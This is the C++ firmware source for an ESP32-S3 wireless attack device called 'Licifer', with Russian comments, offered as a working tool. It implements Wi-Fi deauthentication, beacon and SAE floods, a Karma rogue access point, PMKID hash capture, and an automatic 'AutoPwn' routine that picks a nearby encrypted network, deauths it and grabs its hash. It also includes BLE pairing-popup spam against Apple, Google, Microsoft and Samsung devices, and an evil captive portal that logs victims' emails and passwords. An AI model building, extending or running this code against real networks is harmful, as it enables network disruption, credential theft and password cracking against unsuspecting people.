#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>
#include <DNSServer.h>
#include <driver/temp_sensor.h>

// ---------- Конфигурация ----------
#define FORMAT_LITTLEFS_IF_FAILED true
#define AP_SSID "Licifer_Setup"
#define AP_PASS "12345678"
#define AP_IP IPAddress(192, 168, 4, 1)
#define AP_MASK IPAddress(255, 255, 255, 0)
#define DNS_PORT 53

#define EAPOL_ETHERTYPE_LO    0x88
#define EAPOL_ETHERTYPE_HI    0x8E
#define DEAUTH_REASON_CODE    0x07
#define FRAME_PROBE_REQ_MASK  0xFC
#define FRAME_PROBE_REQ_VALUE 0x40
#define SAE_AKM_SUITE_BYTE3   0x08

#define BLE_APPLE_SOUR        0
#define BLE_GOOGLE_FASTPAIR   1
#define BLE_MICROSOFT_SWIFTPAIR 2
#define BLE_SAMSUNG           3
#define BLE_APPLE_JUICE       5

#define LOG_BUFFER_SIZE (128 * 1024)

#define PMKID_FILE  "/hashes.22000"
#define PORTAL_LOG  "/portal_creds.txt"
#define CONFIG_FILE "/config.json"

AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
DNSServer dnsServer;
portMUX_TYPE attackMux = portMUX_INITIALIZER_UNLOCKED;

struct AttackState {
  bool deauth = false;
  bool beacon = false;
  bool karma = false;              // <-- Karma вернулась
  bool bleSpam = false;
  bool snifferActive = false;
  bool evilPortalActive = false;
  bool pmkidCaptureActive = false;
  bool saeFlood = false;
  bool autoPwn = false;
  uint8_t deauth_bssid[6] = {0};
  uint8_t deauth_sta[6] = {0};
  uint8_t deauth_ch = 1;
  int beaconCount = 50;
  String karmaSsid = "";
  int bleVariant = -1;
  uint8_t pmkidBssid[6] = {0};
  uint8_t pmkidCh = 0;
  uint8_t autoPwnTarget[6] = {0};
  uint8_t autoPwnCh = 0;
  int autoPwnPhase = 0;
  int capturedHashes = 0;
  unsigned long lastLogFlush = 0;
} attack;

char* portalLogBuffer = nullptr;
char* pmkidBuffer = nullptr;
int portalLogLen = 0, pmkidBufferLen = 0;
String apPassword = AP_PASS;

// ---------- Встроенный датчик температуры ESP32‑S3 ----------
float readChipTemp() {
  static temp_sensor_handle_t temp_handle = nullptr;
  
  if (temp_handle == nullptr) {
    temp_sensor_config_t temp_sensor = TEMP_SENSOR_CONFIG_DEFAULT(-10, 80);
    temp_sensor_install(&temp_sensor, &temp_handle);
    temp_sensor_enable(temp_handle);
  }
  
  float tsens_out = 0;
  if (temp_handle != nullptr) {
    temp_sensor_read_celsius(temp_handle, &tsens_out);
  }
  return tsens_out;
}

// ---------- Работа с логами ----------
void flushPortalLog() {
  if (!portalLogBuffer || portalLogLen == 0) return;
  File f = LittleFS.open(PORTAL_LOG, "a");
  if (f) { f.write((uint8_t*)portalLogBuffer, portalLogLen); f.close(); }
  portalLogLen = 0;
}
void flushPMKIDFile() {
  if (!pmkidBuffer || pmkidBufferLen == 0) return;
  File f = LittleFS.open(PMKID_FILE, "a");
  if (f) { f.write((uint8_t*)pmkidBuffer, pmkidBufferLen); f.close(); }
  pmkidBufferLen = 0;
}
void addPortalLog(const String& entry) {
  if (!portalLogBuffer) return;
  int len = entry.length();
  if (portalLogLen + len + 2 > LOG_BUFFER_SIZE) flushPortalLog();
  snprintf(portalLogBuffer + portalLogLen, LOG_BUFFER_SIZE - portalLogLen, "%s\n", entry.c_str());
  portalLogLen += len + 1;
}
void addPMKIDHash(const String& hash) {
  if (!pmkidBuffer) return;
  int len = hash.length();
  if (pmkidBufferLen + len + 2 > LOG_BUFFER_SIZE) flushPMKIDFile();
  snprintf(pmkidBuffer + pmkidBufferLen, LOG_BUFFER_SIZE - pmkidBufferLen, "%s\n", hash.c_str());
  pmkidBufferLen += len + 1;
  attack.capturedHashes++;
}

// ---------- Wi‑Fi атаки ----------
void sendDeauthPacket(const uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t pkt[26] = { 0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  memcpy(pkt+10, bssid, 6);
  memcpy(pkt+16, bssid, 6);
  pkt[24] = DEAUTH_REASON_CODE; pkt[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
}

void sendBeaconFrame(const String& ssid, uint8_t ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  uint8_t bcn[128] = { 0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
  for (int j=0; j<6; j++) bcn[10+j] = random(256);
  memcpy(bcn+16, bcn+10, 6);
  bcn[24]=0; bcn[25]=0; bcn[32]=0x64; bcn[33]=0x00; bcn[34]=0x01; bcn[35]=0x04;
  int pos=36;
  bcn[pos++]=0x00;
  int len = min((int)ssid.length(), 32);
  bcn[pos++]=len;
  memcpy(bcn+pos, ssid.c_str(), len); pos+=len;
  bcn[pos++]=0x01; bcn[pos++]=0x08; bcn[pos++]=0x82; bcn[pos++]=0x84; bcn[pos++]=0x8b; bcn[pos++]=0x96;
  bcn[pos++]=0x03; bcn[pos++]=0x01; bcn[pos++]=ch;
  esp_wifi_80211_tx(WIFI_IF_AP, bcn, pos, false);
}

// ---------- PMKID Grabber ----------
void capturePMKID(const uint8_t* bssid, uint8_t ch) {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    if (payload[24]!=EAPOL_ETHERTYPE_LO || payload[25]!=EAPOL_ETHERTYPE_HI) return;
    uint8_t* eapol = payload+26;
    if (eapol[5]!=2 && eapol[5]!=3) return;
    uint16_t keyDataLen = (eapol[97]<<8) | eapol[98];
    if (keyDataLen<22) return;
    uint8_t* keyData = eapol+99;
    for (int i=0; i<keyDataLen-20; i++) {
      if (keyData[i]==0x30 && keyData[i+1]>=20 && keyData[i+14]>0) {
        char hash[160];
        snprintf(hash,sizeof(hash),"%02x%02x%02x%02x%02x%02x*",
                 attack.pmkidBssid[0],attack.pmkidBssid[1],attack.pmkidBssid[2],
                 attack.pmkidBssid[3],attack.pmkidBssid[4],attack.pmkidBssid[5]);
        for (int j=0; j<16; j++) snprintf(hash+strlen(hash),3,"%02x",keyData[i+17+j]);
        strcat(hash, "*PMKID");
        addPMKIDHash(hash);
        attack.pmkidCaptureActive = false;
        esp_wifi_set_promiscuous(false);
        return;
      }
    }
  });
  uint8_t assoc[100] = {0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  memcpy(assoc+10, bssid,6); memcpy(assoc+16, bssid,6);
  assoc[24]=0; assoc[25]=0; assoc[34]=0x11; assoc[35]=0x04;
  int pos=36;
  assoc[pos++]=0; assoc[pos++]=0; assoc[pos++]=1; assoc[pos++]=4;
  assoc[pos++]=0x82; assoc[pos++]=0x84; assoc[pos++]=0x8b; assoc[pos++]=0x96;
  esp_wifi_80211_tx(WIFI_IF_STA, assoc, pos, false);
}

// ---------- BLE Spam (расширенный набор) ----------
void startBleAdv(int variant) {
  NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
  pAdv->stop();
  NimBLEAdvertisementData adv;
  switch(variant) {
    case BLE_APPLE_SOUR:
      adv.setFlags(0x1A);
      { uint8_t d[] = {0x1b,0xff,0x4c,0x00,0x01,0x07,0x00,0x01,0x10,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
        adv.setManufacturerData(std::string((char*)d,27)); } break;
    case BLE_GOOGLE_FASTPAIR:
      adv.setFlags(0x06);
      { uint8_t m[] = {0x00,0x00,0x00};
        adv.setServiceData(NimBLEUUID("0000fe2c-0000-1000-8000-00805f9b34fb"), std::string((char*)m,3)); } break;
    case BLE_MICROSOFT_SWIFTPAIR: {
      adv.setFlags(0x06);
      uint8_t ms[] = {0x06, 0x00, 0x01,0x00,0x00,0x00,0x00,0x00};
      adv.setManufacturerData(std::string((char*)ms, 8));
      break;
    }
    case BLE_SAMSUNG: {
      adv.setFlags(0x06);
      uint8_t sam[] = {0x75, 0x00, 0x00,0x00};
      adv.setManufacturerData(std::string((char*)sam, 4));
      break;
    }
    case BLE_APPLE_JUICE: {
      adv.setFlags(0x1A);
      uint8_t aj[] = {0x4C,0x00, 0x01,0x00,0x00,0x00,0x00,0x00,0x00};
      adv.setManufacturerData(std::string((char*)aj, 9));
      break;
    }
  }
  pAdv->setAdvertisementData(adv);
  pAdv->start();
}

// ========== FreeRTOS‑задачи ==========
void wifiAttackTask(void*) {
  const char* ssids[] = {"FreeWiFi","Starbucks","Airport_Free","Hotel_Guest"};
  unsigned long lastDeauth=0, lastBeacon=0, lastKarma=0;
  while(1) {
    // Термоконтроль: снижаем мощность BLE при перегреве
    static unsigned long lastTempCheck=0;
    if (millis()-lastTempCheck > 5000) {
      lastTempCheck = millis();
      float temp = readChipTemp();
      if (temp > 70.0) {
        NimBLEDevice::setPower(ESP_PWR_LVL_P3);
      } else {
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
      }
    }

    if (attack.deauth && millis()-lastDeauth>150) {
      lastDeauth=millis();
      sendDeauthPacket(attack.deauth_bssid, attack.deauth_ch);
    }
    if (attack.beacon && millis()-lastBeacon>300) {
      lastBeacon=millis();
      for (int i=0; i<attack.beaconCount; i++) {
        sendBeaconFrame(String(ssids[i%4])+"-"+random(100,999), random(1,14));
        delay(2);
      }
    }
    if (attack.karma) {
      // Karma: если поймали Probe Request с SSID, переключаем AP на этот SSID
      if (attack.karmaSsid != "") {
        WiFi.softAP(attack.karmaSsid.c_str(), nullptr);
        delay(30000); // 30 секунд висим как эта сеть
        WiFi.softAP(AP_SSID, AP_PASS);
        attack.karmaSsid = "";
      }
    }
    if (attack.saeFlood) {
      uint8_t sae[100] = {0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      memcpy(sae+10, attack.deauth_bssid,6);
      memcpy(sae+16, attack.deauth_bssid,6);
      sae[24]=0; sae[25]=0; sae[34]=0x11; sae[35]=0x04;
      int pos=36;
      sae[pos++]=0; sae[pos++]=0; sae[pos++]=1; sae[pos++]=4;
      sae[pos++]=0x82; sae[pos++]=0x84; sae[pos++]=0x8b; sae[pos++]=0x96;
      sae[pos++]=0x30; sae[pos++]=18;
      sae[pos++]=0x01; sae[pos++]=0x00;
      memcpy(sae+pos,"\x00\x0f\xac\x04",4); pos+=4;
      sae[pos++]=0x01; sae[pos++]=0x00;
      memcpy(sae+pos,"\x00\x0f\xac\x08",4); pos+=4;
      esp_wifi_80211_tx(WIFI_IF_STA, sae, pos, false);
      delay(10);
    }
    vTaskDelay(20);
  }
}

void autoPwnTask(void*) {
  while(1) {
    if (!attack.autoPwn) { vTaskDelay(1000); continue; }
    if (attack.autoPwnPhase==0) {
      WiFi.scanNetworks(true);
      delay(4000);
      int n = WiFi.scanComplete();
      if (n>0) {
        int bestRssi=-100, idx=0;
        for (int i=0; i<n; i++) {
          if (WiFi.RSSI(i)>bestRssi && WiFi.encryptionType(i)!=WIFI_AUTH_OPEN) {
            bestRssi=WiFi.RSSI(i); idx=i;
          }
        }
        String bssid = WiFi.BSSIDstr(idx);
        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &attack.autoPwnTarget[0],&attack.autoPwnTarget[1],&attack.autoPwnTarget[2],
               &attack.autoPwnTarget[3],&attack.autoPwnTarget[4],&attack.autoPwnTarget[5]);
        attack.autoPwnCh = WiFi.channel(idx);
        attack.autoPwnPhase = 1;
      }
      WiFi.scanDelete();
    }
    if (attack.autoPwnPhase==1) {
      for (int i=0; i<30; i++) { sendDeauthPacket(attack.autoPwnTarget, attack.autoPwnCh); delay(40); }
      memcpy(attack.pmkidBssid, attack.autoPwnTarget, 6);
      attack.pmkidCh = attack.autoPwnCh;
      capturePMKID(attack.autoPwnTarget, attack.autoPwnCh);
      attack.autoPwnPhase = 0;
      delay(5000);
    }
    vTaskDelay(100);
  }
}

void bleSpamTask(void*) {
  NimBLEDevice::init("Licifer_BLE");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  unsigned long last=0; int cur=0;
  while(1) {
    if (attack.bleSpam && millis()-last>250) {
      last=millis();
      if (attack.bleVariant == -1) {
        cur = (cur+1) % 5;
      } else {
        cur = attack.bleVariant;
      }
      startBleAdv(cur);
    }
    vTaskDelay(50);
  }
}

void dnsTask(void*) {
  while(1) {
    if (attack.evilPortalActive) dnsServer.processNextRequest();
    vTaskDelay(50);
  }
}

void webServerTask(void*) {
  ws.onEvent([](AsyncWebSocket*,AsyncWebSocketClient*,AwsEventType type,void*,uint8_t* data,size_t len){
    if (type!=WS_EVT_DATA) return;
    StaticJsonDocument<512> doc;
    deserializeJson(doc, data, len);
    String cmd = doc["cmd"];
    portENTER_CRITICAL(&attackMux);

    // WiFi атаки
    if (cmd=="start_deauth") {
      attack.deauth = true;
      sscanf(doc["bssid"]|"", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &attack.deauth_bssid[0],&attack.deauth_bssid[1],&attack.deauth_bssid[2],
             &attack.deauth_bssid[3],&attack.deauth_bssid[4],&attack.deauth_bssid[5]);
      attack.deauth_ch = doc["ch"]|1;
    } else if (cmd=="stop_deauth") attack.deauth=false;
    else if (cmd=="start_beacon") { attack.beacon=true; attack.beaconCount=doc["count"]|50; }
    else if (cmd=="stop_beacon") attack.beacon=false;
    else if (cmd=="start_karma") { attack.karma=true; attack.karmaSsid=""; }
    else if (cmd=="stop_karma") attack.karma=false;
    else if (cmd=="start_autopwn") attack.autoPwn=true;
    else if (cmd=="stop_autopwn") attack.autoPwn=false;
    else if (cmd=="start_sae") {
      attack.saeFlood = true;
      sscanf(doc["bssid"]|"", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &attack.deauth_bssid[0],&attack.deauth_bssid[1],&attack.deauth_bssid[2],
             &attack.deauth_bssid[3],&attack.deauth_bssid[4],&attack.deauth_bssid[5]);
    } else if (cmd=="stop_sae") attack.saeFlood=false;

    // BLE (общий старт + отдельные команды)
    else if (cmd=="start_ble") {
      attack.bleSpam = true;
      attack.bleVariant = doc["v"]| -1;
    } else if (cmd=="stop_ble") attack.bleSpam=false;
    else if (cmd=="ble_applejuice") { attack.bleSpam=true; attack.bleVariant=BLE_APPLE_JUICE; }
    else if (cmd=="ble_sourapple")  { attack.bleSpam=true; attack.bleVariant=BLE_APPLE_SOUR; }
    else if (cmd=="ble_fastpair")   { attack.bleSpam=true; attack.bleVariant=BLE_GOOGLE_FASTPAIR; }
    else if (cmd=="ble_swiftpair")  { attack.bleSpam=true; attack.bleVariant=BLE_MICROSOFT_SWIFTPAIR; }
    else if (cmd=="ble_samsung")    { attack.bleSpam=true; attack.bleVariant=BLE_SAMSUNG; }

    // Evil Portal
    else if (cmd=="start_portal") { attack.evilPortalActive=true; dnsServer.start(DNS_PORT,"*",AP_IP); }
    else if (cmd=="stop_portal") { attack.evilPortalActive=false; dnsServer.stop(); }

    // Управление
    else if (cmd=="flush") { flushPortalLog(); flushPMKIDFile(); }
    else if (cmd=="format") LittleFS.format();
    else if (cmd=="scan") WiFi.scanNetworks(true);
    else if (cmd=="set_password") {
      String newPass = doc["password"].as<String>();
      if (newPass.length() >= 8) {
        apPassword = newPass;
        WiFi.softAP(AP_SSID, apPassword.c_str());
        StaticJsonDocument<256> cfg;
        cfg["ap_pass"] = apPassword;
        File f = LittleFS.open(CONFIG_FILE, "w");
        if (f) { serializeJson(cfg, f); f.close(); }
      }
    }

    portEXIT_CRITICAL(&attackMux);
  });

  server.addHandler(&ws);
  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(LittleFS,"/index.html","text/html"); });

  server.on("/api/portal", HTTP_GET, [](AsyncWebServerRequest* r){
    flushPortalLog();
    if (LittleFS.exists(PORTAL_LOG)) {
      r->send(LittleFS, PORTAL_LOG, "text/plain");
    } else {
      r->send(200, "text/plain", "");
    }
  });

  server.on("/api/pmkid", HTTP_GET, [](AsyncWebServerRequest* r){
    flushPMKIDFile();
    if (LittleFS.exists(PMKID_FILE)) {
      r->send(LittleFS, PMKID_FILE, "text/plain");
    } else {
      r->send(200, "text/plain", "");
    }
  });

  server.on("/portal/login", HTTP_POST, [](AsyncWebServerRequest* r){
    addPortalLog("Email:"+r->arg("email")+" Pass:"+r->arg("password"));
    r->send(200,"text/html","<h2>Connected</h2>");
  });
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* r){ r->redirect("/portal/login"); });
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* r){ r->redirect("/portal/login"); });
  server.on("/api/sys", HTTP_GET, [](AsyncWebServerRequest* r){
    StaticJsonDocument<256> info;
    info["psram_free"] = ESP.getFreePsram();
    info["uptime"] = millis();
    info["temp"] = readChipTemp();
    String j; serializeJson(info,j);
    r->send(200,"application/json",j);
  });
  server.begin();

  while(1) {
    int n = WiFi.scanComplete();
    if (n>0) {
      StaticJsonDocument<2048> doc;
      JsonArray nets = doc.createNestedArray("networks");
      for (int i=0; i<n && i<40; i++) {
        JsonObject net = nets.createNestedObject();
        net["ssid"] = WiFi.SSID(i).isEmpty()?"Hidden":WiFi.SSID(i);
        net["bssid"] = WiFi.BSSIDstr(i);
        net["rssi"] = WiFi.RSSI(i);
        net["ch"] = WiFi.channel(i);
        net["enc"] = (WiFi.encryptionType(i)==WIFI_AUTH_OPEN)?"Open":
                      (WiFi.encryptionType(i)==WIFI_AUTH_WEP)?"WEP":
                      (WiFi.encryptionType(i)==WIFI_AUTH_WPA_PSK)?"WPA":
                      (WiFi.encryptionType(i)==WIFI_AUTH_WPA2_PSK)?"WPA2":"WPA3";
        net["wps"] = false; // Упрощение, можно доработать
      }
      String out; serializeJson(doc,out); ws.textAll(out);
      WiFi.scanDelete();
    }
    StaticJsonDocument<256> stat;
    stat["deauth"]=attack.deauth; stat["beacon"]=attack.beacon;
    stat["karma"]=attack.karma;
    stat["ble"]=attack.bleSpam; stat["autopwn"]=attack.autoPwn;
    stat["portal"]=attack.evilPortalActive; stat["pmkidCnt"]=attack.capturedHashes;
    String s; serializeJson(stat,s); ws.textAll(s);
    vTaskDelay(2000);
  }
}

void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type==WIFI_PKT_MGMT) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if ((pkt->payload[0]&FRAME_PROBE_REQ_MASK)!=FRAME_PROBE_REQ_VALUE) return;
    uint8_t* src = pkt->payload+10;
    uint8_t ssidLen = pkt->payload[25];
    if (ssidLen>32) return;
    char ssid[33]={0}; memcpy(ssid,pkt->payload+26,ssidLen);
    // Karma: запоминаем первый попавшийся SSID
    if (attack.karma && attack.karmaSsid=="" && ssidLen>0) {
      attack.karmaSsid = String(ssid);
    }
    StaticJsonDocument<256> c;
    JsonArray arr = c.createNestedArray("clients");
    JsonObject cl = arr.createNestedObject();
    char mac[18]; snprintf(mac,18,"%02x:%02x:%02x:%02x:%02x:%02x",src[0],src[1],src[2],src[3],src[4],src[5]);
    cl["mac"]=mac; cl["rssi"]=pkt->rx_ctrl.rssi; cl["ssid"]=ssid;
    String s; serializeJson(c,s); ws.textAll(s);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  if (psramFound()) {
    portalLogBuffer = (char*)ps_malloc(LOG_BUFFER_SIZE);
    pmkidBuffer     = (char*)ps_malloc(LOG_BUFFER_SIZE);
  }
  if (!portalLogBuffer) portalLogBuffer = (char*)malloc(16*1024);
  if (!pmkidBuffer)     pmkidBuffer     = (char*)malloc(16*1024);
  if (portalLogBuffer) memset(portalLogBuffer,0,LOG_BUFFER_SIZE);
  if (pmkidBuffer)     memset(pmkidBuffer,0,LOG_BUFFER_SIZE);

  LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED);
  if (!LittleFS.exists(PORTAL_LOG)) { File f=LittleFS.open(PORTAL_LOG,"w"); if(f)f.close(); }
  if (!LittleFS.exists(PMKID_FILE)) { File f=LittleFS.open(PMKID_FILE,"w"); if(f)f.close(); }
  if (LittleFS.exists(CONFIG_FILE)) {
    File f = LittleFS.open(CONFIG_FILE, "r");
    if (f) {
      StaticJsonDocument<256> cfg;
      deserializeJson(cfg, f);
      f.close();
      String temp = cfg["ap_pass"].as<String>();
      apPassword = (temp.length() > 0) ? temp : AP_PASS;
    }
  }
  File f = LittleFS.open(PMKID_FILE,"r");
  if (f) { while(f.available()) { if(f.read()=='\n') attack.capturedHashes++; } f.close(); }

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(AP_IP, AP_IP, AP_MASK);
  WiFi.softAP(AP_SSID, apPassword.c_str());
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);

  xTaskCreatePinnedToCore(webServerTask, "WebUI", 16384, NULL, 1, NULL, 0);
  xTaskCreatePinnedToCore(wifiAttackTask, "WiFiAtk", 8192, NULL, 2, NULL, 1);
  xTaskCreatePinnedToCore(autoPwnTask, "AutoPwn", 8192, NULL, 2, NULL, 1);
  xTaskCreatePinnedToCore(bleSpamTask, "BLE", 4096, NULL, 2, NULL, 1);
  xTaskCreatePinnedToCore(dnsTask, "DNS", 4096, NULL, 2, NULL, 0);
}

void loop() { vTaskDelay(10000); }
